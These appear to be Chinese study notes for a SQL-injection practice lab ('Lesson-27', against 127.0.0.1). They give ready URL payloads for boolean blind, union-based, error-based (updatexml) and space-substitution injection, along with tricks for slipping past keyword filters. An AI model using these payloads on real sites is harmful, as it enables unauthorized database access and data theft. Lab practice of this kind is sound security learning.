# Lesson-27
```
Bool盲注-,-双写绕过-,-随机大小写绕过-,-报错注入-,-特殊字符替换空格
```

思路一 : 
```
http://127.0.0.1/Less-27/?id=0%27||()||%271%27=%27--+
利用注入点盲注
```
思路二 : [参考资料](http://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html)
```
利用回显明注 , 过滤了union , 可以通过双写来绕过 , 或者大小写混写来绕过
卧槽这个太屌了
http://127.0.0.1/Less-27/?id=0%27%a0UnION%a0SelECT(user()),2,3%27
%a0 是什么鬼
有待研究
```
思路三 : 
```
利用报错注入
http://127.0.0.1/Less-27/?id=0%27||(updatexml(1,concat(0x5e5e,version(),0x5e5e),1))||%271%27=%27--+
```
思路四 : 
```
强行制造空格 , URL编码 + 注释
http://127.0.0.1/Less-28/?id=0/*%0a*/and/*%0a*/0--+
http://127.0.0.1/Less-27/?id=0%27/*%0a*/or/*%0a*/%27%27=%27
```
